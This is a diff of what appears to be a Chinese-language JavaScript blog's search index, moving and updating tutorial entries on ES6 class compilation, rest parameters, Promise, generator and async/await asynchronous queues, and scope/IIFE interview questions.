-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _createClass = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="function"><span class="keyword">function</span> <span class="title">defineProperties</span>(<span class="params">target, props</span>) </span>&#123; <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123; <span class="keyword">var</span> descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || <span class="literal">false</span>; descriptor.configurable = <span class="literal">true</span>; <span class="keyword">if</span> (<span class="string">"value"</span> <span class="keyword">in</span> descriptor) descriptor.writable = <span class="literal">true</span>; <span class="built_in">Object</span>.defineProperty(target, descriptor.key, descriptor); &#125; &#125; <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">Constructor, protoProps, staticProps</span>) </span>&#123; <span class="keyword">if</span> (protoProps) defineProperties(Constructor.prototype, protoProps); <span class="keyword">if</span> (staticProps) defineProperties(Constructor, staticProps); <span class="keyword">return</span> Constructor; &#125;; &#125;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_classCallCheck</span>(<span class="params">instance, Constructor</span>) </span>&#123; <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> Constructor)) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_possibleConstructorReturn</span>(<span class="params">self, call</span>) </span>&#123; <span class="keyword">if</span> (!self) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">ReferenceError</span>(<span class="string">"this hasn't been initialised - super() hasn't been called"</span>); &#125; <span class="keyword">return</span> call &amp;&amp; (<span class="keyword">typeof</span> call === <span class="string">"object"</span> || <span class="keyword">typeof</span> call === <span class="string">"function"</span>) ? call : self; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_inherits</span>(<span class="params">subClass, superClass</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> superClass !== <span class="string">"function"</span> &amp;&amp; superClass !== <span class="literal">null</span>) &#123; </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Super expression must either be null or a function, not "</span> + <span class="keyword">typeof</span> superClass); </span><br><span class="line">  &#125; </span><br><span class="line">  subClass.prototype = <span class="built_in">Object</span>.create(superClass &amp;&amp; superClass.prototype, &#123; </span><br><span class="line">    <span class="keyword">constructor</span>: &#123; </span><br><span class="line">      value: subClass, </span><br><span class="line">      enumerable: <span class="literal">false</span>, </span><br><span class="line">      writable: <span class="literal">true</span>, </span><br><span class="line">      configurable: <span class="literal">true</span> </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;); </span><br><span class="line">  <span class="keyword">if</span> (superClass) <span class="built_in">Object</span>.setPrototypeOf ? <span class="built_in">Object</span>.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> App = <span class="function"><span class="keyword">function</span> (<span class="params">_Component</span>) </span>&#123;</span><br><span class="line">  _inherits(App, _Component);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    _classCallCheck(<span class="keyword">this</span>, App);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> _this = _possibleConstructorReturn(<span class="keyword">this</span>, (App.__proto__ || <span class="built_in">Object</span>.getPrototypeOf(App)).call(<span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">    _this.props = props;</span><br><span class="line">    <span class="keyword">return</span> _this;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _createClass(App, [&#123;</span><br><span class="line">    key: <span class="string">'fn'</span>,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'fn'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> App;</span><br><span class="line">&#125;(Component);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _createClass = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="function"><span class="keyword">function</span> <span class="title">defineProperties</span>(<span class="params">target, props</span>) </span>&#123; <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123; <span class="keyword">var</span> descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || <span class="literal">false</span>; descriptor.configurable = <span class="literal">true</span>; <span class="keyword">if</span> (<span class="string">"value"</span> <span class="keyword">in</span> descriptor) descriptor.writable = <span class="literal">true</span>; <span class="built_in">Object</span>.defineProperty(target, descriptor.key, descriptor); &#125; &#125; <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">Constructor, protoProps, staticProps</span>) </span>&#123; <span class="keyword">if</span> (protoProps) defineProperties(Constructor.prototype, protoProps); <span class="keyword">if</span> (staticProps) defineProperties(Constructor, staticProps); <span class="keyword">return</span> Constructor; &#125;; &#125;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> _classCallCheck(<span class="params">instance, Constructor</span>) </span>&#123; <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> Constructor)) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> _possibleConstructorReturn(<span class="params">self, call</span>) </span>&#123; <span class="keyword">if</span> (!self) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">ReferenceError</span>(<span class="string">"this hasn't been initialised - super() hasn't been called"</span>); &#125; <span class="keyword">return</span> call &amp;&amp; (<span class="keyword">typeof</span> call === <span class="string">"object"</span> || <span class="keyword">typeof</span> call === <span class="string">"function"</span>) ? call : self; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> _inherits(<span class="params">subClass, superClass</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> superClass !== <span class="string">"function"</span> &amp;&amp; superClass !== <span class="literal">null</span>) &#123; </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Super expression must either be null or a function, not "</span> + <span class="keyword">typeof</span> superClass); </span><br><span class="line">  &#125; </span><br><span class="line">  subClass.prototype = <span class="built_in">Object</span>.create(superClass &amp;&amp; superClass.prototype, &#123; </span><br><span class="line">    <span class="keyword">constructor</span>: &#123; </span><br><span class="line">      value: subClass, </span><br><span class="line">      enumerable: <span class="literal">false</span>, </span><br><span class="line">      writable: <span class="literal">true</span>, </span><br><span class="line">      configurable: <span class="literal">true</span> </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;); </span><br><span class="line">  <span class="keyword">if</span> (superClass) <span class="built_in">Object</span>.setPrototypeOf ? <span class="built_in">Object</span>.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> App = <span class="function"><span class="keyword">function</span> (<span class="params">_Component</span>) </span>&#123;</span><br><span class="line">  _inherits(App, _Component);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    _classCallCheck(<span class="keyword">this</span>, App);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> _this = _possibleConstructorReturn(<span class="keyword">this</span>, (App.__proto__ || <span class="built_in">Object</span>.getPrototypeOf(App)).call(<span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">    _this.props = props;</span><br><span class="line">    <span class="keyword">return</span> _this;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _createClass(App, [&#123;</span><br><span class="line">    key: <span class="string">'fn'</span>,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'fn'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> App;</span><br><span class="line">&#125;(Component);</span><br></pre></td></tr></table></figure>
 <p><code>App</code> 是一个自执行函数，父类 <code>Component</code> 作为参数被传入。 <code>_inherits</code> 方法，子类 <code>subClass.prototype</code> 继承 <code>superClass.prototype</code> 。App 构造函数处理继承父类属性，最后返回 App 构造函数。</p>
 <h3 id="rest-参数"><a href="#rest-参数" class="headerlink" title="rest 参数"></a>rest 参数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  items.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    array.push(item);</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line">push(a, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
 <p>rest 参数使得我们可以传入多余参数，把他们当数组一样处理。（实际上在内部，他们的确被转化成一个数组）。这样就可以不用 arguments 参数。arguments 参数是类数组对象，除了 length 属性和索引元素之外没有任何 Array 属性。</p>
@@ -646,6 +601,51 @@
       <tags>
         <tag>js</tag>
         <tag>ES6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>async/await 异步队列 vs Promise 异步队列</title>
+    <url>/2018/11/20/async-await-and-promise/</url>
+    <content><![CDATA[<p>我在上一篇<a href="https://www.xqyoung.com/2018/11/20/promise-async-then-chain/">Promise 异步编程</a>里面，提到了一个面试题：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> timeout = <span class="function"><span class="params">ms</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;, ms);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ajax1 = <span class="function"><span class="params">()</span> =&gt;</span> timeout(<span class="number">2000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'1'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ajax2 = <span class="function"><span class="params">()</span> =&gt;</span> timeout(<span class="number">1000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ajax3 = <span class="function"><span class="params">()</span> =&gt;</span> timeout(<span class="number">2000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'3'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span>(<span class="params">ajaxArray</span>) </span>&#123;</span><br><span class="line"><span class="comment">//todo 补全函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mergePromise([ajax1, ajax2, ajax3]).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data); <span class="comment">// data 为 [1, 2, 3]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别输出</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// done</span></span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
+<p>实现方法，我用了 promise ：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span>(<span class="params">ajaxArray</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> p = <span class="built_in">Promise</span>.resolve();</span><br><span class="line">  ajaxArray.forEach(<span class="function">(<span class="params">ajax</span>) =&gt;</span> &#123;</span><br><span class="line">    p = p.then(ajax).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      result.push(data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> p.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了保持异步队列按顺序调用，我们要维护一条 promise 链，一般就是在函数作用域内生成一个 resolved 的 <code>Promise.resolve()</code>，然后在它后面接上 then 链。于是我们还要分析，then 的回调是不是返回一个异步 resolve 的 promise ？后面需不需要再接上一条 then 的尾巴，以接收异步 resolve 的结果？</p>
+<p>promise 不好读，因为 promise 基本是 try、catch 和 return 之类的语言原语的替代品。</p>
+<p>我用 async/await 改写一下：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span>(<span class="params">ajaxArray</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> fn <span class="keyword">of</span> ajaxArray) &#123;</span><br><span class="line">      <span class="keyword">let</span> data = <span class="keyword">await</span> fn();</span><br><span class="line">      result.push(data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> run().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在循环里面，我们可以像写同步代码一样写异步代码，await 一个异步结果。</p>
+<h3 id="generator-函数"><a href="#generator-函数" class="headerlink" title="generator 函数"></a>generator 函数</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function*" target="_blank" rel="noopener">生成器函数</a>在执行时能暂停，后面又能从暂停处继续执行。</p>
+<p>调用一个生成器函数并不会马上执行它里面的语句，而是返回一个这个生成器的 迭代器 （iterator ）对象。当这个迭代器的 next() 方法被首次（后续）调用时，其内的语句会执行到第一个（后续）出现yield的位置为止，yield 后紧跟迭代器要返回的值。或者如果用的是 yield*（多了个星号），则表示将执行权移交给另一个生成器函数（当前生成器暂停执行）。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">gen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">10</span>;</span><br><span class="line">    y=<span class="keyword">yield</span> <span class="string">'foo'</span>;</span><br><span class="line">    <span class="keyword">yield</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g=gen();</span><br><span class="line"><span class="built_in">console</span>.log(g.next());<span class="comment">// 执行 yield 10，返回 10</span></span><br><span class="line"><span class="built_in">console</span>.log(g.next());<span class="comment">// 执行 yield 'foo'，返回 'foo'</span></span><br><span class="line"><span class="built_in">console</span>.log(g.next(<span class="number">10</span>));<span class="comment">// 将 10 赋给上一条 yield 'foo' 的左值，即执行 y=10，返回 10</span></span><br><span class="line"><span class="built_in">console</span>.log(g.next());<span class="comment">// 执行完毕，value 为 undefined，done 为 true</span></span><br></pre></td></tr></table></figure>
+<p>更多例子查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function*" target="_blank" rel="noopener">MDN 生成器函数</a></p>
+<h4 id="generator-异步队列"><a href="#generator-异步队列" class="headerlink" title="generator 异步队列"></a>generator 异步队列</h4><p>以上面的代码为例，每次调用 <code>g.next()</code> 会走到下一个 yield 语句，对 yield 语句后面对表达式求值，并且返回形如 <code>{value: someValue, done: false}</code> 的对象，我们希望在生成器函数里面可以像写同步代码一样，yield 一个异步结果。那么 yield 应该返回一个 Promise 实例，通过控制 g.next() 的执行，只有在上一个 yield 返回的 promise resolve/reject 之后，才调用 g.next() 走到下一个 yield 语句。</p>
+<p>我们先有一系列的 promise ，它们是要被异步执行的。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> asyncPromise = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(x + <span class="number">1</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">gen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">yield</span> asyncPromise(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">yield</span> asyncPromise(data1);</span><br><span class="line">  <span class="built_in">console</span>.log(data2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">yield</span> asyncPromise(data2);</span><br><span class="line">  <span class="built_in">console</span>.log(data3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们需要一个控制函数，它接受 gen 作为函数，控制执行流程。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> carryPromise = <span class="function"><span class="keyword">function</span>(<span class="params">gen</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> g = gen();</span><br><span class="line">    <span class="keyword">const</span> next = <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> ret = g.next(data);</span><br><span class="line">      <span class="comment">// 走到最后一个 yield 语句，最好把最后一个值传递下去</span></span><br><span class="line">      <span class="keyword">if</span> (ret.done) &#123;</span><br><span class="line">        resolve(data);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ret.value 其实是一个 promise</span></span><br><span class="line">      <span class="comment">// 这里为刚刚生成的 promise 注册 then 回调，回调的操作是注册下一个 promise</span></span><br><span class="line">      ret.value.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        next(data);</span><br><span class="line">        <span class="comment">// 上面这句换成</span></span><br><span class="line">        <span class="comment">// return next(data);</span></span><br><span class="line">        <span class="comment">// 结果也是一样的，就和 Promise 链式调用一样了</span></span><br><span class="line">        <span class="comment">// 只不过实现上，更偏向控制 g.next() 的移动，来实现 promise 的注册</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    next();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看一下执行结果：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">carryPromise(gen).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`end with: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每项输出前间隔 1 s</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// end with 4</span></span><br></pre></td></tr></table></figure>
+<p>用 generator 实现的异步队列，跟 Promise 的 then 链式回调有些相似，一样是在 promise 的 then 回调里面创建新的 promise ，不一样的是，链式回调的 then 回调里面要 return 这个新的 promise，值才会沿着 then 链传递下去。而 generator 赋给了我们从“外部读取异步结果的能力”，例如 <code>const data1 = yield asyncPromise(1);</code> 。</p>
+<h3 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h3><p>首先搞清楚，async 关键字后面跟一个函数，await 关键字后面跟一个表达式，表达式应该是一个 Promise 对象或者任何要等待的值。</p>
+<p>当调用一个 async 函数时，会返回一个 Promise 对象。当这个 async 函数返回一个值时，Promise 的 resolve 方法会负责传递这个值；当 async 函数抛出异常时，Promise 的 reject 方法也会传递这个异常值。</p>
+<p>async 函数中可能会有 await 表达式，这会使 async 函数暂停执行，等待表达式中的 Promise 执行完成后才会继续执行 async 函数并返回解决结果。</p>
+<p>更多关于 async function，查看 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function" target="_blank" rel="noopener">MDN async function</a></p>
+<p>用 async/await 改写 generator 实现的异步队列：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> asyncPromise(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> asyncPromise(data1);</span><br><span class="line">  <span class="built_in">console</span>.log(data2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">await</span> asyncPromise(data2);</span><br><span class="line">  <span class="built_in">console</span>.log(data3);</span><br><span class="line">  <span class="keyword">return</span> data3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = fn().then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`end with <span class="subst">$&#123;value&#125;</span>`</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>async function 的返回值将被隐式地传递给 Promise.resolve。</p>
+<blockquote>
+<p>参考文章 </p>
+<p><a href="https://pouchdb.com/2015/03/05/taming-the-async-beast-with-es7.html" target="_blank" rel="noopener">Taming the asynchronous beast with ES7</a></p>
+<p><a href="https://juejin.im/post/59cce36751882501c14db49c" target="_blank" rel="noopener">JavaScript 异步队列实现及拓展</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>js 基础</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+        <tag>异步编程</tag>
       </tags>
   </entry>
   <entry>
@@ -826,6 +826,23 @@
       </tags>
   </entry>
   <entry>
+    <title>js 作用域相关问题</title>
+    <url>/2018/11/20/js-scope-related/</url>
+    <content><![CDATA[<h2 id="作用域、闭包相关问题集锦"><a href="#作用域、闭包相关问题集锦" class="headerlink" title="作用域、闭包相关问题集锦"></a>作用域、闭包相关问题集锦</h2><h3 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">MDN IIFE（ 立即调用函数表达式）</a></p>
+<p>判断以下执行结果：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(env); <span class="comment">// inner</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<h3 id="扩展-console-log-方法"><a href="#扩展-console-log-方法" class="headerlink" title="扩展 console.log 方法"></a>扩展 console.log 方法</h3><p>扩展 console.log 方法，每个输出前增加一个自增序号。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myLog</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        id++;</span><br><span class="line">        <span class="keyword">var</span> fn_args = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">        fn_args.unshift(id+<span class="string">':'</span>);</span><br><span class="line">        fn.apply(<span class="literal">null</span>, fn_args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log = myLog(<span class="built_in">console</span>.log);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'foo'</span>);       <span class="comment">// 1: foo</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bar'</span>);       <span class="comment">// 2: bar</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'num:'</span>, num); <span class="comment">// 3: num: 2</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>js 基础</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+        <tag>面试题</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>js-prototype-pollution</title>
     <url>/2019/07/21/js-prototype-pollution/</url>
     <content><![CDATA[<blockquote>
@@ -985,23 +1002,6 @@
       <tags>
         <tag>js</tag>
         <tag>异步编程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>js 作用域相关问题</title>
-    <url>/2018/11/20/js-scope-related/</url>
-    <content><![CDATA[<h2 id="作用域、闭包相关问题集锦"><a href="#作用域、闭包相关问题集锦" class="headerlink" title="作用域、闭包相关问题集锦"></a>作用域、闭包相关问题集锦</h2><h3 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">MDN IIFE（ 立即调用函数表达式）</a></p>
-<p>判断以下执行结果：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> env = <span class="string">'outer'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> env = <span class="string">'inner'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(env); <span class="comment">// inner</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
